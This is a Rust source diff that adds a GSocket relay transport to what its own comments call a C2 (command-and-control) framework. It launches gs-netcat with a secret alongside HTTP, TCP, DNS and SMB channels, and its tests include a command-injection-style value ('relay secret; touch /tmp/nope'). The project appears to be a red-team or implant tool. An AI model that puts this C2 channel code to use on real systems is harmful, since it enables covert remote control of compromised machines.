@@ -1,8 +1,14 @@
 use reqwest::Client;
 use serde::Serialize;
+use std::path::{Path, PathBuf};
+use std::process::Stdio;
+use std::sync::{Arc, Mutex};
 use std::time::Duration;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
+use tokio::process::{Child, Command};
+
+use nw_profile::config::GSocketConfig;
 
 /// A C2 transport. The wire content is a sealed (AEAD) envelope blob; the
 /// transport only moves opaque bytes and chooses the framing. Chosen at runtime
@@ -21,6 +27,11 @@ pub enum Transport {
         host: String,
         port: u16,
     },
+    GSocket {
+        host: String,
+        port: u16,
+        forward: Arc<GSocketForward>,
+    },
     Dns {
         host: String,
         port: u16,
@@ -35,6 +46,10 @@ pub enum Transport {
 impl Transport {
     /// Build a transport from an endpoint string by its scheme.
     pub fn from_endpoint(endpoint: &str) -> Result<Self, String> {
+        Self::from_profile(endpoint, None)
+    }
+
+    pub fn from_profile(endpoint: &str, gsocket: Option<GSocketConfig>) -> Result<Self, String> {
         let (scheme, rest) = endpoint
             .split_once("://")
             .ok_or_else(|| format!("endpoint {endpoint:?} has no scheme"))?;
@@ -43,7 +58,7 @@ impl Transport {
                 client: Client::new(),
                 base: endpoint.trim_end_matches('/').to_owned(),
             }),
-            "tcp" | "gs" => {
+            "tcp" => {
                 let host = rest
                     .rsplit_once(':')
                     .map(|(h, _)| h)
@@ -58,6 +73,32 @@ impl Transport {
                     return Err(format!("endpoint {endpoint:?} has no host"));
                 }
                 Ok(Transport::Tcp { host, port })
+            }
+            "gs" => {
+                let config = gsocket.ok_or_else(|| {
+                    "gs:// endpoint requires an encrypted GSocket configuration".to_string()
+                })?;
+                if config.secret.trim().is_empty() {
+                    return Err("GSocket secret cannot be empty".into());
+                }
+                let host = rest
+                    .rsplit_once(':')
+                    .map(|(h, _)| h)
+                    .unwrap_or(rest)
+                    .trim_matches(['[', ']'])
+                    .to_owned();
+                let port = rest
+                    .rsplit_once(':')
+                    .and_then(|(_, p)| p.parse::<u16>().ok())
+                    .ok_or_else(|| format!("endpoint {endpoint:?} has no valid tcp port"))?;
+                if host.is_empty() || port != config.local_port {
+                    return Err("GSocket endpoint must use its configured local port".into());
+                }
+                Ok(Transport::GSocket {
+                    host,
+                    port,
+                    forward: Arc::new(GSocketForward::new(config)),
+                })
             }
             "dns" => {
                 let (host, port) = rest
@@ -98,6 +139,7 @@ impl Transport {
         match self {
             Transport::Http { base, .. } => base.clone(),
             Transport::Tcp { host, port } => format!("tcp://{host}:{port}"),
+            Transport::GSocket { host, port, .. } => format!("gs://{host}:{port}"),
             Transport::Dns { host, port } => format!("dns://{host}:{port}"),
             Transport::Smb {
                 host,
@@ -114,7 +156,7 @@ impl Transport {
     /// size file-chunk batches per poll.
     pub fn inner_budget(&self) -> usize {
         match self {
-            Transport::Http { .. } | Transport::Tcp { .. } => 32 * 1024,
+            Transport::Http { .. } | Transport::Tcp { .. } | Transport::GSocket { .. } => 32 * 1024,
             Transport::Dns { .. } => 1200,
             Transport::Smb { .. } => 32 * 1024,
         }
@@ -126,6 +168,14 @@ impl Transport {
         match self {
             Transport::Http { client, base } => http_exchange(client, base, sealed).await,
             Transport::Tcp { host, port } => tcp_exchange(host, *port, sealed).await,
+            Transport::GSocket {
+                host,
+                port,
+                forward,
+            } => {
+                forward.ensure_started()?;
+                tcp_exchange(host, *port, sealed).await
+            }
             Transport::Dns { host, port } => dns_exchange(host, *port, sealed).await,
             Transport::Smb {
                 host,
@@ -134,6 +184,74 @@ impl Transport {
             } => smb_exchange(host, share, resource, sealed).await,
         }
     }
+}
+
+pub struct GSocketForward {
+    executable: PathBuf,
+    config: GSocketConfig,
+    child: Mutex<Option<Child>>,
+}
+
+impl GSocketForward {
+    fn new(config: GSocketConfig) -> Self {
+        let executable = std::env::var_os("NW_GS_NETCAT")
+            .map(PathBuf::from)
+            .unwrap_or_else(|| PathBuf::from("gs-netcat"));
+        Self {
+            executable,
+            config,
+            child: Mutex::new(None),
+        }
+    }
+
+    fn ensure_started(&self) -> Result<(), String> {
+        let mut slot = self
+            .child
+            .lock()
+            .map_err(|_| "GSocket process lock poisoned".to_string())?;
+        if let Some(child) = slot.as_mut() {
+            match child.try_wait() {
+                Ok(None) => return Ok(()),
+                Ok(Some(status)) => {
+                    tracing::warn!(%status, "gs-netcat forward exited; restarting");
+                }
+                Err(error) => return Err(format!("inspect gs-netcat process: {error}")),
+            }
+        }
+        let child = gsocket_command(
+            &self.executable,
+            &self.config.secret,
+            self.config.local_port,
+        )
+        .kill_on_drop(true)
+        .stdin(Stdio::null())
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .spawn()
+        .map_err(|error| format!("start {}: {error}", self.executable.display()))?;
+        *slot = Some(child);
+        tracing::info!(
+            local_port = self.config.local_port,
+            "GSocket local forward started"
+        );
+        Ok(())
+    }
+}
+
+impl Drop for GSocketForward {
+    fn drop(&mut self) {
+        if let Ok(slot) = self.child.get_mut()
+            && let Some(child) = slot.as_mut()
+        {
+            let _ = child.start_kill();
+        }
+    }
+}
+
+fn gsocket_command(executable: &Path, secret: &str, port: u16) -> Command {
+    let mut command = Command::new(executable);
+    command.args(["-s", secret, "-p", &port.to_string()]);
+    command
 }
 
 async fn dns_exchange(host: &str, port: u16, sealed: &[u8]) -> Result<Vec<u8>, String> {
@@ -282,6 +400,7 @@ async fn smb_exchange(
 #[cfg(test)]
 mod tests {
     use super::*;
+    use nw_profile::config::GSocketConfig;
 
     #[test]
     fn scheme_selects_transport() {
@@ -293,16 +412,55 @@ mod tests {
             Transport::from_endpoint("tcp://10.0.0.5:4444").unwrap(),
             Transport::Tcp { .. }
         ));
-        assert!(matches!(
-            Transport::from_endpoint("gs://localhost:4630").unwrap(),
-            Transport::Tcp { .. }
-        ));
+        assert!(Transport::from_endpoint("gs://localhost:4630").is_err());
+        let gs = Transport::from_profile(
+            "gs://127.0.0.1:4630",
+            Some(GSocketConfig {
+                secret: "relay-secret".into(),
+                local_port: 4630,
+            }),
+        )
+        .unwrap();
+        assert!(matches!(gs, Transport::GSocket { .. }));
+        assert_eq!(gs.describe(), "gs://127.0.0.1:4630");
+        assert!(!gs.describe().contains("relay-secret"));
         assert!(matches!(
             Transport::from_endpoint("dns://dns.example.com").unwrap(),
             Transport::Dns { .. }
         ));
         assert!(Transport::from_endpoint("ftp://x:1").is_err());
         assert!(Transport::from_endpoint("naked").is_err());
+    }
+
+    #[test]
+    fn gsocket_command_uses_direct_arguments() {
+        let command = gsocket_command(
+            std::path::Path::new("/opt/bin/gs-netcat"),
+            "relay secret; touch /tmp/nope",
+            4630,
+        );
+        let command = command.as_std();
+        assert_eq!(command.get_program(), "/opt/bin/gs-netcat");
+        let args = command
+            .get_args()
+            .map(|arg| arg.to_string_lossy().into_owned())
+            .collect::<Vec<_>>();
+        assert_eq!(args, ["-s", "relay secret; touch /tmp/nope", "-p", "4630"]);
+    }
+
+    #[test]
+    fn missing_gsocket_binary_is_reported_without_the_secret() {
+        let forward = GSocketForward {
+            executable: PathBuf::from("/definitely/missing/gs-netcat"),
+            config: GSocketConfig {
+                secret: "never-log-this-secret".into(),
+                local_port: 4630,
+            },
+            child: Mutex::new(None),
+        };
+        let error = forward.ensure_started().unwrap_err();
+        assert!(error.contains("/definitely/missing/gs-netcat"));
+        assert!(!error.contains("never-log-this-secret"));
     }
 
     #[test]
